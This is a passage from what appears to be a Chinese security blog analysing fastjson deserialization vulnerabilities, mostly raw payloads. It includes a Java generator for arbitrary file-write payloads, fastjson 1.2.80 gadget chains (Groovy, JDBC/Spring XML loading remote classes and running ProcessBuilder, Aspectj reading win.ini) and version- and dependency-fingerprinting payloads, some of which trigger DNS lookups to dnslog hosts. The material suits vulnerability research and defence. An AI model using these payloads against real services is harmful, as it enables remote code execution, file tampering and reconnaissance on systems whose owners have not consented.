class="line">generateWriterOutputStream(</span><br><span class="line">generateFileWriterWithEncoding(targetFilePath, <span class="literal">false</span>),</span><br><span class="line"><span class="literal">false</span>),</span><br><span class="line"><span class="literal">false</span>),</span><br><span class="line">(<span class="type">int</span>) file.length()),</span><br><span class="line"><span class="literal">false</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成引用型 payload</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> payloadFile    写入文件本地存储位置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetFilePath 写出目标文件位置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回 payload</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateRefPayload</span><span class="params">(String payloadFile, String targetFilePath)</span> &#123;</span><br><span class="line"><span class="type">File</span>   <span class="variable">file</span>        <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(payloadFile);</span><br><span class="line"><span class="type">String</span> <span class="variable">fileContent</span> <span class="operator">=</span> readFile(file);</span><br><span class="line"><span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(fileContent)) &#123;</span><br><span class="line"><span class="keyword">return</span> bypassSpecializedClass(</span><br><span class="line">useCurrencyTriggerAllGetter(</span><br><span class="line"><span class="string">&quot;&#123;\&quot;writer\&quot;:&quot;</span> + generateFileWriterWithEncoding(targetFilePath, <span class="literal">true</span>) +</span><br><span class="line"><span class="string">&quot;,\&quot;outputStream\&quot;:&quot;</span> + generateWriterOutputStream(<span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.writer\&quot;&#125;&quot;</span>, <span class="literal">true</span>) +</span><br><span class="line"><span class="string">&quot;,\&quot;charInputStream\&quot;:&quot;</span> + generateCharSequenceInputStream(fileContent, <span class="literal">true</span>) +</span><br><span class="line"><span class="string">&quot;,\&quot;teeInputStream\&quot;:&quot;</span> + generateTeeInputStream(<span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.charInputStream\&quot;&#125;&quot;</span>, <span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.outputStream\&quot;&#125;&quot;</span>, <span class="literal">true</span>) +</span><br><span class="line"><span class="string">&quot;,\&quot;inputStream\&quot;:&quot;</span> + generateBOMInputStream(<span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$.currency.teeInputStream\&quot;&#125;&quot;</span>, (<span class="type">int</span>) file.length()) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">, <span class="literal">true</span></span><br><span class="line">)</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">file</span>   <span class="operator">=</span> <span class="string">&quot;/Users/phoebe/Downloads/12.txt&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> <span class="string">&quot;/Users/phoebe/Downloads/123.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常调用 payload 生成</span></span><br><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> generatePayload(file, target);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用类型 payload 生成</span></span><br><span class="line"><span class="type">String</span> <span class="variable">payloadWithRef</span> <span class="operator">=</span> generateRefPayload(file, target);</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下三种调用方式均可兼容，触发反序列化</span></span><br><span class="line"><span class="comment">//JSON.parse(payloadWithRef);</span></span><br><span class="line">JSON.parseObject(payloadWithRef);</span><br><span class="line"><span class="comment">//JSON.parseObject(payloadWithRef,POC.class);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-80"><a href="#fastjson-1-2-80" class="headerlink" title="fastjson 1.2.80"></a>fastjson 1.2.80</h3><blockquote><p><font style="color:#000000;">fastjson &lt;&#x3D; 1.2.80，依旧还是利用期望类，可在特定条件下绕过AutoType关闭限制加载远程对象进行反序列化。</font></p></blockquote><p><font style="color:#000000;">与fastjson 1.2.68一样，该版本的漏洞利用，依旧还是利用的期望类，在1.2.68版本中，主要是使用expectClass中的AutoCloseable进行文件读写操作，而在1.2.80版本中，利用的期望类为Throwable.class。</font></p><h4 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span>,</span><br><span class="line">    <span class="string">&quot;unit&quot;</span>:&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;config&quot;</span>:&#123;</span><br><span class="line">     <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span>,</span><br><span class="line">     <span class="string">&quot;classpathList&quot;</span>:<span class="string">&quot;http://127.0.0.1:9999/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.python.antlr.ParseException&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>:&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.python.core.PyObject&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ziclix.python.sql.PyConnection&quot;</span>,</span><br><span class="line">        <span class="string">&quot;connection&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.postgresql.jdbc.PgConnection&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostSpecs&quot;</span>:[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;host&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;port&quot;</span>:<span class="number">2333</span></span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;user&quot;</span>:<span class="string">&quot;user&quot;</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="string">&quot;info&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;socketFactory&quot;</span>:<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>,</span><br><span class="line">                <span class="string">&quot;socketFactoryArg&quot;</span>:<span class="string">&quot;http://127.0.0.1:8090/exp.xml&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;url&quot;</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">  http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">list</span> <span class="attr">value-type</span>=<span class="string">&quot;java.lang.String&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;pb.start()&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Aspectj"><a href="#Aspectj" class="headerlink" title="Aspectj"></a>Aspectj</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一次</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二次</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">             &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span>,</span><br><span class="line">                <span class="string">&quot;newAnnotationProcessorUnits&quot;</span>:[&#123;&#125;]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三次，针对Windows系统</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fileName&quot;</span>:<span class="string">&quot;c:/windows/win.ini&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 另一种姿势，报错回显</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Character&quot;</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;c&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;</span>,</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fileName&quot;</span>:<span class="string">&quot;c:/windows/win.ini&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><h3 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h3><h4 id="利用报错信息来获取版本号"><a href="#利用报错信息来获取版本号" class="headerlink" title="利用报错信息来获取版本号"></a>利用报错信息来获取版本号</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该方法在大概FastJson 1.2.76版本后无效，即便是通过这种方式探测出精准的FastJson版本，也是1.2.76，即便是使用的1.2.80的依赖，因为在源码中并没有改变</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure><h4 id="无报错进行fastjson版本探测"><a href="#无报错进行fastjson版本探测" class="headerlink" title="无报错进行fastjson版本探测"></a>无报错进行fastjson版本探测</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不报错1.2.83/1.2.24, 报错1.2.25-1.2.80</span></span><br><span class="line">&#123;<span class="string">&quot;zero&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.XxException&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不报错1.2.24-1.2.68, 报错1.2.70-1.2.83</span></span><br><span class="line">&#123;<span class="string">&quot;zero&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不报错1.2.24-1.2.47, 报错1.2.48-1.2.83</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不报错1.2.24, 报错1.2.25-1.2.83</span></span><br><span class="line">&#123;<span class="string">&quot;zero&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="利用DNS请求来探测fastjson版本"><a href="#利用DNS请求来探测fastjson版本" class="headerlink" title="利用DNS请求来探测fastjson版本"></a>利用DNS请求来探测fastjson版本</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fastjson &lt; 1.2.43</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;:<span class="string">&quot;x&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson &lt;= 1.2.47</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.InetSocketAddress&quot;</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>:,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;aaa.xxxx.ceye.io&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson &lt; 1.2.48</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetAddress&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson &lt; 1.2.68</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;:<span class="string">&quot;aaa&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.URL&quot;</span>, <span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;&#125;<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">Set[&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;]</span><br><span class="line">Set[&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="string">&quot;address&quot;</span>:,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;:<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson &lt;= 1.2.80收到一个dns请求, fastjson 1.2.83收到两个dns请求</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span>,</span><br><span class="line">    <span class="string">&quot;x&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.InetSocketAddress&quot;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>:,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;ccc.4fhgzj.dnslog.cn&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.InetSocketAddress&quot;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>:,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;ddd.4fhgzj.dnslog.cn&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="利用FastJson的回显报错探测依赖"><a href="#利用FastJson的回显报错探测依赖" class="headerlink" title="利用FastJson的回显报错探测依赖"></a><font style="color:#000000;">利用FastJson的回显报错探测依赖</font></h4><p><font style="color:#000000;">针对黑盒情况下，在确定FastJson具体版本后进一步探测该环境存在的一些依赖，从而选择对应的Payload，而不是一味的盲打。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 系统存在这个类, 会返回一个类实例, 如果不存在会返回null</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;z&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;groovy.lang.GroovyShell&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;z&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;org.springframework.web.bind.annotation.RequestMapping&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735039307088-0c250fe5-7e08-414d-b31f-84ae5e972351.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用Character转换报错, 若存在则会抛出报错can not cast to char, value : xxx</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Character&quot;</span>&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">  <span class="string">&quot;val&quot;</span>: <span class="string">&quot;org.springframework.web.bind.annotation.RequestMapping&quot;</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735039677606-f8d22ae1-ac3f-4052-84b1-5d5f7944b347.png"></p><p><font style="color:#000000;">以下是部分依赖对应的POC探测。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 